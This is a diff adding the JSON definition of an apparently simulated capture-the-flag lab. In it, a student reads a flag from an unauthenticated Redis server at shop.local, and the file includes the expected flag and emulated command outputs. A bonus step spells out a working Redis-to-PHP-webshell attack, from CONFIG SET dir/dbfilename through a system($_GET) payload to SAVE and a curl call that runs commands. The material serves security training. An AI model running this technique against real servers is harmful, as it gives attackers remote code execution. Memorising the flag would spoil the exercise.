@@ -1,0 +1,98 @@
+{
+  "id": "db-redis",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{r3d1s_n0_4uth_n0_m3rcy}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: Redis без пароля на shop.local:6379\n\nПодключение: `redis-cli -u redis://shop.local:6379 <команда>`.\n\n1. Живость: `redis-cli -u redis://shop.local:6379 PING` → `PONG` (значит, `requirepass` не задан).\n2. Карта: `redis-cli -u redis://shop.local:6379 INFO server` и `... INFO keyspace`.\n3. Ключи: `redis-cli -u redis://shop.local:6379 --scan` (безопаснее `KEYS *`).\n4. Значения: `redis-cli -u redis://shop.local:6379 GET secret:flag`.\n5. Флаг: `... GET secret:flag | grep 'nto' > found.txt`, затем `check`.\nБонус (webshell): `CONFIG SET dir /var/www/html`, `CONFIG SET dbfilename shell.php`,\n`SET x '<?php system($_GET[\"c\"]); ?>'`, `SAVE`, затем `curl -s 'http://shop.local/shell.php?c=id'`.\n"
+    }
+  ],
+  "tools": {
+    "redis-cli": {
+      "help": "redis-cli -u redis://<host>:<port> <команда> — клиент Redis",
+      "cases": [
+        {
+          "match": "\\bping\\b",
+          "example": "-u redis://shop.local:6379 PING",
+          "output": "PONG\n"
+        },
+        {
+          "match": "info\\s+server",
+          "example": "-u redis://shop.local:6379 INFO server",
+          "output": "# Server\r\nredis_version:7.0.11\r\nredis_git_sha1:00000000\r\nredis_mode:standalone\r\nos:Linux 5.15.0 x86_64\r\narch_bits:64\r\nconfig_file:/etc/redis/redis.conf\r\n"
+        },
+        {
+          "match": "info\\s+keyspace",
+          "example": "-u redis://shop.local:6379 INFO keyspace",
+          "output": "# Keyspace\r\ndb0:keys=1240,expires=12,avg_ttl=0\r\n"
+        },
+        {
+          "match": "--scan.*sess:",
+          "example": "-u redis://shop.local:6379 --scan --pattern 'sess:*'",
+          "output": "sess:9f2a1c\nsess:44b0de\n"
+        },
+        {
+          "match": "get\\s+sess:",
+          "example": "-u redis://shop.local:6379 GET sess:9f2a1c",
+          "output": "{\"uid\":1,\"role\":\"admin\"}\n"
+        },
+        {
+          "match": "--scan",
+          "example": "-u redis://shop.local:6379 --scan",
+          "output": "sess:9f2a1c\nsess:44b0de\ncache:config\nsecret:flag\n"
+        },
+        {
+          "match": "get\\s+secret:flag",
+          "example": "-u redis://shop.local:6379 GET secret:flag",
+          "output": "nto{r3d1s_n0_4uth_n0_m3rcy}\n"
+        },
+        {
+          "match": "config\\s+get\\s+dir",
+          "example": "-u redis://shop.local:6379 CONFIG GET dir",
+          "output": "1) \"dir\"\n2) \"/var/lib/redis\"\n"
+        },
+        {
+          "match": "config\\s+get\\s+dbfilename",
+          "example": "-u redis://shop.local:6379 CONFIG GET dbfilename",
+          "output": "1) \"dbfilename\"\n2) \"dump.rdb\"\n"
+        },
+        {
+          "match": "config\\s+set",
+          "example": "-u redis://shop.local:6379 CONFIG SET dir /var/www/html",
+          "output": "OK\n"
+        },
+        {
+          "match": "\\bset\\s+x\\b",
+          "example": "-u redis://shop.local:6379 SET x '<?php system($_GET[\"c\"]); ?>'",
+          "output": "OK\n"
+        },
+        {
+          "match": "\\bsave\\b",
+          "example": "-u redis://shop.local:6379 SAVE",
+          "output": "OK\n"
+        }
+      ],
+      "fallback": "redis-cli: в этой лабе доступны PING, INFO, --scan, GET, CONFIG GET/SET, SET, SAVE.\n"
+    },
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция webshell на shop.local)",
+      "cases": [
+        {
+          "match": "shell\\.php",
+          "example": "-s 'http://shop.local/shell.php?c=id'",
+          "output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только http://shop.local/shell.php.\n"
+    }
+  }
+}
